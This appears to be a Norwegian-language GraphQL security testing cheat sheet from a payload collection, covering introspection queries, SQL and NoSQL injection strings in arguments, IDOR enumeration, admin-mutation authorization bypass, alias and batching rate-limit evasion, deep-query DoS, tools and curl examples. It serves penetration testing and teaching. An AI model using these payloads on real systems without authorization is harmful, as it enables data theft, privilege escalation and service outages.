# 📊 Hurtigreferanse for GraphQL-injeksjon

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](GraphQL-Injection.tr.md) • [🇬🇷 Ελληνικά](GraphQL-Injection.el.md)

> **Begreper og presisering:** Introspeksjon beskriver skjemaet; en resolver henter feltdata, mens autorisasjon avgjør hvem som får lese eller endre dem. Introspeksjon eller feltforslag er ikke alene bevis på uautorisert datatilgang. GraphQL-navn skiller mellom store og små bokstaver, og standardvalidering avviser sirkulære fragmenter; det viste sirkeleksemplet er derfor ikke en generell DoS mot en korrekt implementasjon. Se [GraphQL-spesifikasjonen](https://spec.graphql.org/October2021/#sec-Fragment-spreads-must-not-form-cycles). Injeksjon, batching og dybdebelastning avhenger av resolver, validering og ressursgrenser. Eksemplene er bevart.

```
 ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗     
██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔═══██╗██║     
██║  ███╗██████╔╝███████║██████╔╝███████║██║   ██║██║     
██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║██║▄▄ ██║██║     
╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║╚██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚══▀▀═╝ ╚══════╝
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🔍 Grunnleggende GraphQL

### Vanlige endepunkter
```
/graphql
/graphiql
/v1/graphql
/v2/graphql
/api/graphql
/graph
/query
/gql
/playground
```

### Oppbygning av forespørsler
```graphql
# Spørring
{
  user(id: 1) {
    name
    email
  }
}

# Med operasjonsnavn
query GetUser {
  user(id: 1) {
    name
  }
}

# Mutasjon
mutation {
  createUser(name: "test", email: "test@test.com") {
    id
    name
  }
}
```

---

## 🎯 Introspeksjonsspørringer

### Introspeksjon av hele skjemaet
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### Spørringstype (inngangspunkter)
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Mutasjonstype
```graphql
{
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Alle typer
```graphql
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

### Detaljer om en bestemt type
```graphql
{
  __type(name: "User") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

---

## 💉 Injeksjonsangrep

### SQL-injeksjon via GraphQL
```graphql
# I argumenter
{
  user(id: "1' OR '1'='1") {
    name
    email
    password
  }
}

# UNION-basert
{
  user(name: "' UNION SELECT username,password FROM users--") {
    name
  }
}
```

### NoSQL-injeksjon
```graphql
{
  user(username: "{\"$ne\": null}") {
    name
    email
  }
}

# Eller som JSON
{
  "query": "{ user(filter: {username: {$ne: \"\"}}) { name email } }"
}
```

### IDOR (Insecure Direct Object Reference, manglende objektbasert tilgangskontroll)
```graphql
# Tilgang til andre brukeres data
{
  user(id: 1) { name email password }
}
{
  user(id: 2) { name email password }
}
{
  user(id: 3) { name email password }
}

# Kartlegg alle brukere
{
  users {
    id
    name
    email
    role
  }
}
```

---

## 🔥 Omgåelse av autorisasjon

### Manglende autentisering på mutasjoner
```graphql
# Prøv administratoroperasjoner som vanlig bruker
mutation {
  deleteUser(id: 1) {
    success
  }
}

mutation {
  updateUserRole(id: 1, role: "admin") {
    id
    role
  }
}
```

### Omgåelse via nestede spørringer
```graphql
# Få tilgang til sensitive data gjennom relasjoner
{
  posts {
    author {
      email
      passwordHash
      adminToken
    }
  }
}

{
  comments {
    user {
      privateMessages {
        content
      }
    }
  }
}
```

### Misbruk av feltforslag
```graphql
# Prøv ugyldige felt hvis forslag er aktivert
{
  user(id: 1) {
    passwor  # Kan foreslå "password"
  }
}
```

---

## 🚀 Informasjonslekkasje

### Feilsøkingsinformasjon
```graphql
# Feilbasert kartlegging
{
  __typename
}

# Ugyldig spørring for å få stakkspor
{
  invalid_field_that_doesnt_exist
}
```

### Finne sensitive felt
```graphql
{
  user(id: 1) {
    id
    username
    email
    password
    passwordHash
    token
    apiKey
    secret
    privateKey
    ssn
    creditCard
    internalId
  }
}
```

---

## 🛡️ Omgåelsesteknikker

### Aliasbasert omgåelse
```graphql
# Omgå hastighetsbegrensning med aliaser
{
  a: user(id: 1) { name }
  b: user(id: 2) { name }
  c: user(id: 3) { name }
  d: user(id: 4) { name }
}
```

### Angrep med samling av spørringer (batching)
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

### Endring av store og små bokstaver
```graphql
# Prøv ulike kombinasjoner av store og små bokstaver
{
  USER(id: 1) { name }
}
{
  User(id: 1) { name }
}
```

### Fragmentinjeksjon
```graphql
{
  user(id: 1) {
    ...sensitiveData
  }
}

fragment sensitiveData on User {
  password
  apiKey
  token
}
```

---

## 💣 Tjenestenektangrep (DoS)

### Angrep med dype spørringer
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}
```

### Sirkulært fragment
```graphql
query {
  user(id: 1) {
    ...A
  }
}

fragment A on User {
  ...B
}

fragment B on User {
  ...A  # Sirkulær referanse
}
```

### Stort resultatsett
```graphql
{
  users(first: 999999) {
    id
    name
    email
    posts {
      id
      comments {
        id
      }
    }
  }
}
```

---

## 🛠️ Testverktøy

### GraphQL Voyager
```bash
# Visualiser skjemaet
https://graphql-kit.com/graphql-voyager/
# Lim inn introspeksjonsresultatet
```

### InQL (Burp-utvidelse)
```
# Funksjoner:
- Uthenting av skjema
- Generering av spørringer
- Sårbarhetsskanning
```

### graphql-cop
```bash
# Verktøy for sikkerhetsrevisjon
pip install graphql-cop
graphql-cop -t https://target.com/graphql
```

### graphw00f
```bash
# Identifikasjon av GraphQL-implementasjon
git clone https://github.com/dolevf/graphw00f
python3 main.py -t https://target.com/graphql
```

### Altair GraphQL Client
```
# Skrivebordsklient for testing
https://altairgraphql.dev/
```

---

## 📝 cURL-eksempler

### Grunnleggende spørring
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { name email } }"}'
```

### Med variabler
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query GetUser($id: Int!) { user(id: $id) { name } }", "variables": {"id": 1}}'
```

### Introspeksjon
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

### Med autentisering
```bash
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"query": "{ me { name } }"}'
```

---

## 📋 Sjekkliste for testing

```markdown
## Sjekkliste for GraphQL-sikkerhet

□ Identifiser GraphQL-endepunkter
□ Kontroller introspeksjon (uthenting av skjema)
□ Hent ut alle spørringer og mutasjoner
□ Test IDOR i objektspørringer
□ Test autorisasjon på mutasjoner
□ Se etter SQL-/NoSQL-injeksjon i argumenter
□ Test nestede spørringer for datalekkasjer
□ Kontroller hastighetsbegrensning (omgåelse med aliaser)
□ Test samling av spørringer
□ Se etter sensitive felt (password, token)
□ Test dybdebegrensning (DoS)
□ Se etter lekkasje i feilmeldinger
□ Test abonnementsendepunkter
```

---

## 🔗 Oversikt over vanlige sårbarheter

| Sårbarhet | Test | Konsekvens |
|---------------|------|--------|
| **Introspeksjon aktivert** | Spør etter `__schema` | Eksponering av skjema |
| **IDOR** | Endre ID-er i spørringer | Tilgang til andre brukeres data |
| **Manglende autentisering** | Spørring uten token | Uautorisert tilgang |
| **SQLi/NoSQLi** | Injiser i argumenter | Kompromittering av database |
| **For mye data** | Spør etter sensitive felt | Datalekkasje |
| **DoS** | Dype eller sirkulære spørringer | Tjenesten utilgjengelig |
| **Misbruk av batching** | Flere spørringer | Omgåelse av hastighetsbegrensning |

---

## 🔗 Relaterte payloads

- [SQLi-payloads](SQLi.nb.md)
- [NoSQL-injeksjon](NoSQL-Injection.nb.md)
- [API-sikkerhet](../../API-Security/README.md)

---

**Tilbake til payloadsamlingen:** [💉 Payloadsamling](../../README.md#-payloads-collection)
